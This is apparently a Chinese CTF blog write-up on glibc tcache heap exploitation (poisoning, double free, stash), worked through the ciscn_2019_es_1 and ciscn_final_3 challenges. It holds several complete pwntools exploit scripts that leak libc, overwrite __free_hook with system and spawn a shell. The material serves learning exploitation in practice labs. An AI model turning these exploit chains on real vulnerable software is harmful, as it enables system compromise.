---
title: tcache attack
tags: [ctf-pwn,heap]
date: 2023-12-01 17:58:00
categories: [ctf-pwn]
excerpt: tcache poisioning, tcache key leak, tcache double free
---

## tcache poisoning

tcache poisioning指的是，修改管理tcache的chunk（就是那个chunk列表里那个大小为0x250，在最前面的）偏移0x10上的内容。

这里是存储每个bin中有多少个chunk的地方，全都改成7（tcache bin每个里最多7个chunk），这样再free的时候不管多大，都不会再进入tcache bin，然后就可以通过泄露unsorted bin，减96（因为有tcache），拿到mainarena，再减16拿到malloc_hook。

> 以前不知道的是，如果某个bin里的chunk个数为0，但是指针非空，继续malloc，他会变成负的（
>
> 详见下文exp
>

也算是uaf里的一类

### ciscn_2019_es_1

<https://buuoj.cn/challenges#ciscn_2019_es_1>

这道题可以用tcache poisioning来让chunk free时直接进入unsorted bin，uaf泄露malloc hook

但是这道题应该是被魔改过的（

因为他 heap number 最大是 12，可以强行填满tcache（就不用poisioning了），并且输入的compary‘s call（它是不是想写company写错了。。。）并没有用上。。。所以才认为是一个魔改的题目

下面是这两种做法

#### 填满tcache

```python
from pwn import *
#context.log_level = 'DEBUG'
context.arch = 'amd64'
p = process("./ciscn_2019_es_1")
libc = ELF("./glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc.so.6")

def cmd(choice:int):
    p.recvuntil(b"choice:")
    p.sendline(str(choice).encode())

def new(size:int, content):
    cmd(1)
    p.recvuntil(b"Please input the size of compary's name")
    p.sendline(str(size).encode())
    p.recvuntil(b"please input name:")
    p.send(content)
    p.recvuntil(b"please input compary call:")
    p.send(b'123\x00')

def dump(index:int):
    cmd(2)
    p.sendline(str(index).encode())

def free(index:int):
    cmd(3)
    p.sendline(str(index).encode())

def exp():
    new(0x80, b'arttnba3') # idx 0
    new(0x80, b'arttnba3') # idx 1
    new(0x80, b'arttnba3') # idx 2
    new(0x80, b'arttnba3') # idx 3
    new(0x80, b'arttnba3') # idx 4
    new(0x80, b'arttnba3') # idx 5
    new(0x80, b'arttnba3') # idx 6
    new(0x80, b'arttnba3') # idx 7
    new(0x10, b'arttnba3') # idx 8
    new(0x80, b'/bin/sh\x00') # idx 9
	
    free(0)
    free(1)
    free(2)
    free(3)
    free(4)
    free(5)
    free(6) # tcache 的 0x80 位置被填满了
    
    free(7)
    dump(7)
    main_arena = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - 96
    __malloc_hook = main_arena - 0x10
    libc_base = __malloc_hook - libc.sym['__malloc_hook']
    log.success('libc base leak: ' + hex(libc_base))
    free(8)
    free(8)
    new(0x10, p64(libc_base + libc.sym['__free_hook']))
    new(0x10, p64(libc_base + libc.sym['system']))
    free(9)

    p.interactive()

if __name__ == '__main__':
    exp()
```

#### tcache poisoning

一开始连续4次free 0 ，然后一次new拿走两个chunk，并将0.contend.fd设置为heapbase+0x10（tcache的链表指针指向content）

heapbase是泄露的heap地址取高12位（页的开头？）

第二次new的时候，第一个chunk还是0.content，第二个chunk就是heapbase开始的了，一个0和15个7，将除了0x20的bin全部填满，0x20的bin后面还要靠uaf改free_hook，不能置为7。

这时0x80的chunk free之后就会进入unsorted bin，之后就没区别了。

```python
from pwn import *
#context.log_level = 'DEBUG'
context.arch = 'amd64'
p = process("./ciscn_2019_es_1")
libc = ELF("./glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc.so.6")

def cmd(choice:int):
    p.recvuntil(b"choice:")
    p.sendline(str(choice).encode())

def new(size:int, content):
    cmd(1)
    p.recvuntil(b"Please input the size of compary's name")
    p.sendline(str(size).encode())
    p.recvuntil(b"please input name:")
    p.send(content)
    p.recvuntil(b"please input compary call:")
    p.send(b'123\x00')

def dump(index:int):
    cmd(2)
    p.sendline(str(index).encode())

def free(index:int):
    cmd(3)
    p.sendline(str(index).encode())

def exp():
    new(0x10, b'arttnba3') # idx 0
    new(0x10, b'arttnba3') # idx 1
    new(0x80, b'arttnba3') # idx 2
    new(0x10, b'/bin/sh\x00') # idx 3
    free(0)
    free(0)
    dump(0)
    p.recvuntil(b'name:\n')
    heap_leak = u64(p.recv(6).ljust(8, b'\x00'))
    heap_base = heap_leak & 0xfffffffff000
    log.success('heap base leak: ' + hex(heap_base))
    free(0)
    free(0)
    #gdb.attach(p)
    new(0x10, p64(heap_base + 0x10)) # idx 4
    #gdb.attach(p)
    new(0x10, b'\x00' + b'\x07' * 0xf) # idx 5, hijack the tcache
    #gdb.attach(p)
    # 0.content.fd -> base + 0x10, 5.content = base+0x10
    # every tcache bin is full (num=7) ,except 0x20(num=0)
    free(2)
    dump(2)
    main_arena = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - 96
    __malloc_hook = main_arena - 0x10
    libc_base = __malloc_hook - libc.sym['__malloc_hook']
    log.success('libc base leak: ' + hex(libc_base))
    free(0)
    free(0)
    new(0x10, p64(libc_base + libc.sym['__free_hook']))
    #gdb.attach(p)
    new(0x10, p64(libc_base + libc.sym['system']))
    # tcachebinis.0x20 = -2 ，也就是说即使计数的变量为0了，只要链表指针不空，就还能malloc
    gdb.attach(p)
    free(3)

    p.interactive()

if __name__ == '__main__':
    exp()
```



## tcache key 泄露 

在2.29版本以后，chunk被free到tcache之后，fd字段会指向tcache结构体（就是那个0x290的chunk），在free的时候看到bk=tcache，会检查tcache中是否有这个块

![](/img/ctf-pwn/tcache attack/1.jpg)

因此double free之前需要把这个字段给改掉，或者用它来泄露堆地址

### diary 





## tcache double free

2.26 和 2.27较早的版本是没有double free 检查的，即可以连着2次free同一个chunk

### ciscn_final_3

<https://buuoj.cn/challenges#ciscn_2019_final_3>

libc2.27（无double free检测的版本），只有new和delete，delete之后没有清空指针，并且new之后输出chunk的content部分的地址。不允许分配0x78以上大小的chunk。

整体思路：通过double free可以在任意地址分配chunk的原理，在某个chunk减16的位置分配chunk，新的chunk就可以修改旧的chunk的sz字段，让他可以被free到 unsorted bin 。

没有show函数，如何泄露unsorted bin的地址？

> 切割unsorted bin里的chunk，使这个chunk和一个**已经被free**的tcache chunk开头对齐，这时就相当于修改了tcache chunk的fd，fd= & unsorted bin，
>
> 连续分配两次chunk，就可以在unsorted bin处分配一个chunk， 题目自带泄露chunk地址的功能，就等于泄露了libc

再来一个tcache double free，向free hook写入system，然后free一个content=binsh的chunk，就完事了

**如何想到的呢？**

题目只有new和delete，以及泄露chunk地址。想要泄露libc就必须通过这个自带的泄露实现。因此要在unsorted bin这个地方malloc一个chunk（毕竟我只会通过unsorted bin泄露libc地址），结合题目最大chunk不超过0x78的限制，得到必须要改某个chunk的sz字段的结论。

然后没有edit，只有new的时候能修改，因此要利用“向任意地址分配chunk”的漏洞，然后一看，正好可以用double free，对上了。

至于chunk被free到unsorted bin之后如何泄露fd，bk，这确实很难想到。“切割unsorted bin把它的开头和一个free的tcache chunk对齐” 这一点也只有这道题能用了，毕竟需要有知道chunk被分配到哪里的能力。

```python
from pwn import *
from LibcSearcher import *
context.log_level = 'DEBUG'
context.arch = 'amd64'

p = remote('node4.buuoj.cn',28198)
e = ELF('./ciscn_final_3')
libc = ELF("./libc.so.6") 


def delete(index):
    p.recvuntil(b'choice > ')
    p.sendline(b'2')
    p.recvuntil(b'input the index\n')
    p.sendline(str(index).encode())

def new(index, size, content):
    p.recvuntil(b"choice > ")
    p.sendline(b'1')
    p.recvuntil(b'input the index\n')
    p.sendline(str(index).encode())
    p.recvuntil(b'input the size\n')
    p.sendline(str(size).encode())
    p.recvuntil(b'now you can write something\n')
    p.sendline(content)
    p.recvuntil(b'gift :')
    return eval(p.recvuntil(b'\n')[:-1])

addr0 = new(0, 0x70, 'aaa')
new(1, 0x40, 'aaa')
new(2, 0x70, 'aaa')
new(3, 0x70, 'aaa')
new(4, 0x70, '/bin/sh\x00')
new(5, 0x70, 'aaa')
new(6, 0x70, 'aaa')
new(7, 0x70, 'aaa')
new(8, 0x70, 'aaa') # from 0 - 8 -> sz= 0x450
new(9, 0x70, 'aaa') 
new(10, 0x70, 'aaa')

delete(10)
delete(10)
new(11, 0x70, p64(addr0 - 16))
new(12, 0x70, p64(addr0 - 16))
new(13, 0x70, p64(0) + p64(0x451)) # size must be equal to the front 
delete(0)
delete(1)
new(14, 0x70, 'aaa') # cut unsorted bin chunk
new(15, 0x40, 'aaa')
main_arena = new(16, 0x40, 'aaa') - 96
libc_base = main_arena-0x10-libc.sym['__malloc_hook']
system_addr = libc_base+libc.sym['system']
free_hook = libc_base+libc.sym['__free_hook']
new(17, 0x10, 'aaa')
delete(17)
delete(17)
new(18, 0x10, p64(free_hook))
new(19, 0x10, p64(free_hook))
new(20, 0x10, p64(system_addr))
delete(4)
p.interactive()
```

还有个地方没想明白，为什么题目里这个0x40，改成0x50也对（同时也修改0x461），改成0x70（同时也修改0x481）就不对了。。。想不明白了 😭

## tcache stash 

比如当一个线程申请0x50大小的chunk时，如果tcache没有，那么就会进入分配区进行处理，如果对应bin中存在0x50的chunk，除了取出并返回之外，ptmalloc会认为这个线程在将来还需要相同的大小的chunk，因此就会把对应bin中0x50的chunk尽可能的放入tcache的对应链表中去。

### ciscn_final_3

还是上一节这道题，不用tcache 连续double free无检查的漏洞。

抄的大佬的博客：<https://arttnba3.cn/2021/05/10/PWN-0X01-GLIBC_HEAP-EXPLOIT/#%E4%BE%8B%E9%A2%982%EF%BC%88fastbin-double-free%EF%BC%89%EF%BC%9Aciscn-2019-final-3>

但是最后面pwndbg显示不出来堆，exp没看懂（

以后再说

```python
from pwn import *
context.arch = 'amd64'
#context.log_level = 'debug'
#p = remote('node4.buuoj.cn', 28849) 
p = process('./ciscn_final_3')
#libc = ELF('./libc.so.6') 
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')#

context.terminal = ["tmux", "splitw", "-h"]

def cmd(choice:int):
    p.recvuntil(b"choice > ")
    p.sendline(str(choice).encode())


def new(index:int,size:int , content):
    cmd(1)
    p.recvuntil(b"input the index")
    p.sendline(str(index).encode())
    p.recvuntil(b"input the size")
    p.sendline(str(size).encode())
    p.recvuntil(b"now you can write something")
    p.send(content)

def free(index:int):
    cmd(2)
    p.recvuntil(b"input the index")
    p.sendline(str(index).encode())

def exp():
    new(0, 0x70, b'arttnba3') 
    p.recvuntil(b"gift :")
    heap_leak = int(p.recvuntil(b'\n', drop = True), 16)
    log.info('heap addr leak: ' + hex(heap_leak))
    heap_base = heap_leak - 0x11e70 # tcache struct 's header
    log.success('heap base: ' + hex(heap_base)) # leak 0

    for i in range(1,10):
        new(i, 0x70, b'arttnba3')
    for i in range(7): # 0~6 free tcache is full
        free(i)
    #gdb.attach(p)
    free(7) #  free(x) to tcache then free(x) to fastbin can't trigger error
    free(8)
    free(7) # fastbin double free 

    for i in range(10,17): 
        new(i, 0x70, b'/bin/sh\x00') # 10 ~ 16 == 0 ~ 6
    #gdb.attach(p)
    new(17, 0x70, p64(heap_base + 0x10)) # stash , fastbin to tcache
    # gdb.attach(p)
    new(18, 0x70, b'arttnba3')
    new(19, 0x70, b'arttnba3')
    new(20, 0x70, (b'\x00' * 35 + b'\x07' * 1).ljust(0x40, b'\x00') + p64(heap_base + 0x10) * 6)
    #gdb.attach(p)
    # change 36th to 7 (36th is 0x250, the size of tcache struct)
    # and change tcache_entry *entries[0~6] which ranges from 0x20 to 0x70
    free(20) # to unsorted bin
    gdb.attach(p)
    # why tcache_entry changed ?
    new(21, 0x20, b'arttnba3')
    new(22, 0x20, b'arttnba3') # can't pwndbg
    p.recvuntil(b"gift :")
    libc_leak = int(p.recvuntil(b'\n', drop = True), 16)
    log.info('libc addr leak: ' + hex(libc_leak))
    libc_base = libc_leak - 0x3ebca0
    log.success('libc base: ' + hex(libc_base))

    #gdb.attach(p)
    new(23, 0x50, (b'\x01' * 10).ljust(0x40, b'\x00') + p64(libc_base + libc.sym['__free_hook']) * 2)
    new(24, 0x10, p64(libc_base + libc.sym['system']))
    free(10)
    p.interactive()

if __name__ == '__main__':
    exp()
```

